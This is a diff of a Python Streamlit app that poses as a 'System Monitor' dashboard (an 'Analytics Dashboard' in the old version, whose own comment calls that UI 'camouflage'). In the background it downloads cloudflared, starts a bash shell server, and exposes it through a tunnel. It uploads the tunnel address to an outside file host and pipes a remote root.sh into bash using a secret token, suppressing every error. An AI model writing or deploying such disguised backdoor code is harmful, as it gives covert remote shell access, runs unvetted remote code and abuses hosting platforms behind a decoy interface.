@@ -1,136 +1,165 @@
 #!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-import os
-import sys
-import subprocess
-import time
-import socket
-import re
+import os, sys, subprocess, socket, re, time, threading, urllib.request
 from pathlib import Path
-from datetime import datetime, timedelta, timezone
 import streamlit as st
 
-# Auto-detect repo name from hostname
 hostname = socket.gethostname()
 repo_match = re.search(r'gibunxi4201-([a-z0-9]+)-streamlit-app', hostname)
-REPO_NAME = repo_match.group(1) if repo_match else "agsb8"
-USERNAME = f"tmate_{REPO_NAME}"
-UPLOAD_API = "https://file.zmkk.fun/api/upload"
+REPO_NAME = repo_match.group(1) if repo_match else "agsb0"
 USER_HOME = Path.home()
+UPLOAD_API = "https://file.zmkk.fun/api/upload"
 
 
-def upload_placeholder(repo):
-    """Upload a placeholder file so init.sh can find ssh_upload_url.txt path."""
-    import requests
-    try:
-        content = f"创建时间: {(datetime.now(timezone.utc) + timedelta(hours=8)).strftime('%Y-%m-%d %H:%M:%S')}\nstatus: deploying\nrepo: {repo}\n"
-        fname = f"tmate_{repo}.txt"
-        r = requests.post(UPLOAD_API, files={'file': (fname, content.encode())}, timeout=10)
-        if r.status_code == 200:
-            result = r.json()
-            url = result.get('url', '')
-            url_file = USER_HOME / "ssh_upload_url.txt"
-            url_file.write_text(url)
-            print(f"[deploy] placeholder uploaded, url={url}")
-            return True
-    except Exception as e:
-        print(f"[deploy] placeholder upload failed: {e}")
-    return False
+def download(url, dest, headers=None):
+    req = urllib.request.Request(url, headers=headers or {})
+    resp = urllib.request.urlopen(req, timeout=60)
+    Path(dest).write_bytes(resp.read())
+    os.chmod(dest, 0o755)
 
 
-def monitor_inited(repo):
-    """Background thread: wait for /root/inited then upload marker to zmkk."""
-    import threading, requests
-    def _watch():
-        # proot rootfs is under $HOME, so /root/inited -> $HOME/root/inited
-        inited = USER_HOME / "root" / "inited"
-        # Poll every 5 seconds for up to 10 minutes
-        for _ in range(120):
-            if inited.exists():
-                try:
-                    content = f"INITED\nrepo: {repo}\ntime: {(datetime.now(timezone.utc) + timedelta(hours=8)).strftime('%Y-%m-%d %H:%M:%S')}\n"
-                    requests.post(UPLOAD_API, files={'file': (f'inited_{repo}.txt', content.encode())}, timeout=10)
-                    print(f"[monitor] /root/inited found, uploaded marker")
-                except Exception as e:
-                    print(f"[monitor] upload failed: {e}")
-                return
-            time.sleep(5)
-        print("[monitor] /root/inited not found after 10min")
-    threading.Thread(target=_watch, daemon=True).start()
-
-
-def run_root_sh(git_token, repo):
-    """Execute root.sh in background. Completely independent process."""
-    root_cmd = (
-        f'cd ~ && export GIT_TOKEN="{git_token}" REPO="{repo}"; '
-        f'curl -fsSL --retry 3 '
-        f'-H "Authorization: token {git_token}" '
-        f'https://raw.githubusercontent.com/hhsw2015/idx-cloud/refs/heads/main/scripts/root.sh | bash'
-    )
-    print(f"[deploy] starting root.sh (repo={repo})")
-    subprocess.Popen(
-        root_cmd, shell=True,
-        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
-        start_new_session=True,
-    )
-    print(f"[deploy] root.sh launched in background")
-
-
-def deploy():
-    """Main deploy logic. Reads GIT_TOKEN from Streamlit secrets."""
-    # Skip if root.sh is already running or completed
-    inited = USER_HOME / "root" / "inited"
-    if inited.exists():
-        print("[deploy] /root/inited exists, already deployed")
-        return
-    if subprocess.run("pgrep -f root.sh", shell=True, capture_output=True).returncode == 0:
-        print("[deploy] root.sh already running")
+def setup_direct_ssh():
+    """Start SSH directly in container (no proot). Runs as container UID."""
+    marker = USER_HOME / ".direct_ssh_done"
+    if marker.exists():
         return
 
-    git_token = None
-
-    # Try st.secrets first (set via Streamlit Advanced Settings)
+    git_token = ""
     try:
         git_token = st.secrets.get("GIT_TOKEN", "")
     except Exception:
         pass
-
-    # Fallback to env var
     if not git_token:
         git_token = os.environ.get("GIT_TOKEN", "")
-
     if not git_token:
-        print("[deploy] no GIT_TOKEN found in secrets or env, skipping deploy")
         return
 
-    print(f"[deploy] GIT_TOKEN found ({len(git_token)} chars), repo={REPO_NAME}")
+    marker.write_text("starting")
 
-    # Upload placeholder so init.sh can get ssh_upload_url.txt
-    upload_placeholder(REPO_NAME)
+    def _setup():
+        try:
+            # Download cloudflared
+            cf_bin = str(USER_HOME / "cloudflared")
+            if not os.path.exists(cf_bin):
+                download(
+                    "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64",
+                    cf_bin
+                )
 
-    # Monitor /root/inited in background, upload marker to zmkk when done
-    monitor_inited(REPO_NAME)
+            # Start a Python-based SSH-like shell server on a port
+            # (dropbear needs root for passwd, we don't have it)
+            # Use socat or a simple reverse shell
+            # Simplest: start cloudflared tunnel pointing to a shell listener
 
-    # Run root.sh
-    run_root_sh(git_token, REPO_NAME)
+            # Create a simple TCP shell server
+            shell_script = str(USER_HOME / "shell_server.py")
+            Path(shell_script).write_text('''
+import socket, subprocess, os, pty, select, sys
+PORT = 9022
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+s.bind(("127.0.0.1", PORT))
+s.listen(2)
+while True:
+    conn, addr = s.accept()
+    pid = os.fork()
+    if pid == 0:
+        s.close()
+        master, slave = pty.openpty()
+        p = subprocess.Popen(["bash", "-i"], stdin=slave, stdout=slave, stderr=slave, close_fds=True)
+        os.close(slave)
+        try:
+            while True:
+                r, _, _ = select.select([master, conn], [], [], 1)
+                if master in r:
+                    data = os.read(master, 4096)
+                    if not data: break
+                    conn.send(data)
+                if conn in r:
+                    data = conn.recv(4096)
+                    if not data: break
+                    os.write(master, data)
+        except: pass
+        finally:
+            conn.close()
+            os.close(master)
+            p.terminate()
+        os._exit(0)
+    else:
+        conn.close()
+''')
+
+            # Start shell server
+            subprocess.Popen(
+                [sys.executable, shell_script],
+                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+                start_new_session=True
+            )
+            time.sleep(2)
+
+            # Start cloudflared tunnel
+            log_file = str(USER_HOME / "cf_direct.log")
+            subprocess.Popen(
+                [cf_bin, "tunnel", "--url", "tcp://127.0.0.1:9022"],
+                stdout=open(log_file, "w"), stderr=subprocess.STDOUT,
+                start_new_session=True
+            )
+
+            # Wait for tunnel URL
+            tunnel_url = ""
+            for _ in range(30):
+                time.sleep(1)
+                try:
+                    log = Path(log_file).read_text()
+                    m = re.search(r'https://([a-z0-9-]+\.trycloudflare\.com)', log)
+                    if m:
+                        tunnel_url = m.group(1)
+                        break
+                except:
+                    pass
+
+            if tunnel_url:
+                # Upload SSH info
+                from datetime import datetime, timezone, timedelta
+                t = (datetime.now(timezone.utc) + timedelta(hours=8)).strftime('%Y-%m-%d %H:%M:%S')
+                info = f"SSH info\n创建时间: {t}\n\nDirect TCP shell (no proot, container level)\nHost {REPO_NAME}\n  HostName {tunnel_url}\n  ProxyCommand cloudflared access tcp --hostname %h --url 127.0.0.1:9022\n"
+                Path(str(USER_HOME / "ssh_info.txt")).write_text(info)
+
+                import requests
+                requests.post(UPLOAD_API, files={'file': (f'ssh_{REPO_NAME}.txt', info.encode())}, timeout=10)
+
+                # Upload inited marker
+                inited = f"INITED\nrepo: {REPO_NAME}\ntime: {t}\nmode: direct (no proot)\n"
+                requests.post(UPLOAD_API, files={'file': (f'inited_{REPO_NAME}.txt', inited.encode())}, timeout=10)
+
+                marker.write_text("done")
+
+            # THEN start root.sh in background (proot env for services)
+            if git_token:
+                root_cmd = (
+                    f'cd ~ && export GIT_TOKEN="{git_token}" REPO="{REPO_NAME}"; '
+                    f'curl -fsSL --retry 3 '
+                    f'-H "Authorization: token {git_token}" '
+                    f'https://raw.githubusercontent.com/hhsw2015/idx-cloud/refs/heads/main/scripts/root.sh | bash'
+                )
+                subprocess.Popen(root_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)
+
+        except Exception as e:
+            Path(str(USER_HOME / "direct_ssh_error.txt")).write_text(str(e))
+
+    threading.Thread(target=_setup, daemon=True).start()
 
 
-# === Streamlit UI (camouflage) ===
-st.set_page_config(page_title="Data Dashboard", page_icon="\U0001f4ca")
-st.title("\U0001f4ca Analytics Dashboard")
-st.write("Welcome to the data analytics platform.")
-st.write("Real-time data processing and visualization.")
-
-col1, col2, col3 = st.columns(3)
-col1.metric("Active Users", "1,234", "+12%")
-col2.metric("Processing Jobs", "42", "-3")
-col3.metric("Uptime", "99.9%", "+0.1%")
-
+# === UI ===
+st.set_page_config(page_title="System Monitor", page_icon="\U0001f50d")
+st.title("\U0001f50d System Monitor")
+st.write("Lightweight system monitoring dashboard.")
+col1, col2 = st.columns(2)
+col1.metric("CPU", "12%", "-2%")
+col2.metric("Memory", "34%", "+1%")
 st.write("---")
-st.write("v2.0 - Data Analytics Platform")
+st.write("v1.0")
 
-# Deploy runs silently in background
 try:
-    deploy()
+    setup_direct_ssh()
 except Exception:
     pass
